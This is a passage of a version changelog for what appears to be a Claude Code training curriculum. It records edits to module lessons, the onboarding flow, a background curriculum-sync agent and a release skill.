- Update all 4 READMEs with `/stats, /cost` in Module 3 feature lists

## v2.7.15 (2026-03-05)

- Expand /compact teaching with auto-compact explanation (~95% trigger, what gets preserved vs lost, CLAUDE.md survival insight)
- Add "When Claude Forgets" troubleshooting section to all 4 projects' Module 3
- Add context consumption tips to /context sections (what costs context, line-range reading tip)
- Fix Sentinel Module 3 memory hierarchy order (was incorrectly listing user memory before project memory)

## v2.7.14 (2026-03-05)

- Add automated test step (2.8) to Canvas Module 2 — validation script checks broken links, titles, nav consistency, alt text
- Update effort level documentation across all 4 Module 2 files — available for Opus and Sonnet, medium default, arrow key controls
- Rewrite effort levels section in context/models.txt
- Add formatting rule to CLAUDE.md — no blockquote formatting for student-facing content
- Add CC version mismatch warning to Step 6.8 in SKILL.md
- Remove outdated git pull tip from Module 1 recap
- Split Step 6.7 paragraph for readability

## v2.7.13 (2026-03-05)

- Fix blockquote formatting in verbatim messages — `>` prefix renders as dim italics in the CLI, replaced with plain text output

## v2.7.12 (2026-03-05)

- Convert all key teaching messages in SKILL.md to verbatim output — prevents Claude from truncating or rewording carefully crafted content
- Add "this is your space" welcome message — encourages students to ask questions, experiment, and go off-script anytime

## v2.7.11 (2026-03-05)

- Add screenshot lesson to Module 2 — students paste their homepage into Claude Code for visual feedback
- Add correct OS-specific image paste shortcuts (Alt+V on Windows, Ctrl+V on macOS/Linux)
- Add "normal mode vs plan mode" framing to all 4 Module 2 variants with bolded key behavior
- Add universal pacing rule to CLAUDE.md — one step per message, stop and wait for all modules
- Explain ~ path in Step 6.3 with OS-specific examples so beginners understand the location
- Introduce edit-check-commit loop in Step 6.5 when students first complete the cycle
- Add context to Step 6.7 explaining why CLAUDE.md preferences shape Claude's behavior
- List tracked files after first commit so beginners see exactly what's in their save point

## v2.7.10 (2026-03-05)

- Fix Windows file-open command — replace `start` (CMD built-in) with `powershell.exe -Command "Start-Process"` which works from bash

## v2.7.9 (2026-03-05)

- Remove blocking checkpoint (Step 0.6) from onboarding — curriculum sync runs fully in the background and finishes well before Module 2
- Add non-blocking status check at Module 1 completion (Step 6.8) for an informational update on sync progress
- Tell users at spawn time that the agent will finish on its own — no need to wait or watch

## v2.7.8 (2026-03-05)

- Fix checkpoint timing — ensure curriculum sync agent finishes before Module 1 starts by using blocking TaskOutput
- Add checkpoint reminder at end of Step 4 so Claude doesn't skip Step 0.6
- Fix "in another tab" wording to "in the background"

## v2.7.7 (2026-03-05)

- Fix agent viewing guidance timing — defer ↓/Esc/Ctrl+F instructions from spawn (Step 0.1) to checkpoint (Step 0.6), only shown when the agent is still running and there's something to watch

## v2.7.6 (2026-03-05)

- Add agent viewing guidance to background curriculum sync — teach users to press ↓ to watch the background agent work in real time, Esc to return, and Ctrl+F twice to kill it
- Make checkpoint wait (Step 0.6) interactive — encourage users to explore the agent manager instead of passively waiting

## v2.7.5 (2026-03-05)

- Run curriculum sync as a background agent — Steps 0.2–0.5 now execute in a background agent instead of blocking onboarding, so users start making choices immediately while the update runs
- Add checkpoint (Step 0.6) before project scaffolding to guarantee sync completion before Module 1 delivery
- Early teaching moment: users see a real background agent in action before Module 8 covers them formally

## v2.7.4 (2026-03-05)

- Add suggested next actions to onboarding step endings — each pause point in `/start` now ends with a bold suggested response (e.g., "let's go", "looks good", "ready") so beginners aren't left at a blank prompt

## v2.7.3 (2026-03-05)

- Add environment variable troubleshooting entry to `context/ide-integration.txt` — covers VS Code/Cursor not inheriting shell env vars (model config, Bedrock/Vertex provider setup)

## v2.7.2 (2026-03-05)

- Add model selection guidance to Module 2 curriculum (new Step 2.3b in all 4 projects)
- New `context/models.txt` reference doc covering model tiers, `/model`, `/fast`, effort levels, and prompting strategies
- Domain-specific model examples: Canvas (design system), Forge (storage format), Nexus (API gateway), Sentinel (analysis algorithm)

## v2.7.1 (2026-03-05)

- Improve `/release` skill — auto-commits pending changes and runs end-to-end without confirmations
- Add sparq GitHub Release step to release checklist (MEMORY.md + skill)

## v2.7.0 (2026-03-05)

- Add `/release` skill — interactive guided release checklist (version bump, tag, GitHub Release, sparq sync)
- Add release checklist to MEMORY.md for persistent cross-session reference
- Update README badge from v2.5.0 to v2.7.0

## v2.0.0

- Major content update: sync curriculum to Claude Code v2.1.43–v2.1.68 (26 releases)
- New context file: `context/auto-memory.txt` covering the auto-memory system
- Updated 8 context reference docs with new hook events (WorktreeCreate, WorktreeRemove, ConfigChange), HTTP hooks, auto-memory, new commands (/simplify, /batch, /copy, /memory), agent frontmatter (isolation: worktree, background: true), plugin settings.json, and model changes
- Updated 16 module files across all 4 projects (Modules 1, 5, 8, 10) with new CC features matched to teaching personas
- Added community cross-reference (affaan-m/everything-claude-code) to CLAUDE.md

## v1.2.0

- Add self-updating curriculum sync (Step 0 in `/start`) — detects when Claude Code has shipped new features since the curriculum was last synced, researches them, and updates context files + module guides across all 4 projects before onboarding begins
- Graceful offline fallback — curriculum sync skips silently if GitHub is unreachable
- Block GitHub fetch URLs in smoke test so curriculum sync doesn't interfere with headless testing

## v1.1.0

- Auto-detect package manager and batch-install missing tools in `/start` Step 4 (supports pip, npm, brew, apt, conda, Docker)
- Add git config check before first commit to prevent cryptic errors for new git users
- Add `/start` resume capability via `.claude/onboarding-state.json` for interrupted sessions
- Add "next module" prompt to all module deliveries, not just Module 1
- Replace full context file listing in CLAUDE.md with dynamic `ls context/` discovery
- Normalize CC features lines across all 4 projects for consistency
- Add gitignored test suite (479 tests) for repo validation

## v1.0.1

- Fixed `/start` skill error on macOS caused by backticks in SKILL.md triggering bash permission hook failures
- Added `.gitattributes` to enforce LF line endings on scripts for cross-platform compatibility
- Added MIT license, disclaimers, and legal notices

## v1.0.0

- Product launch
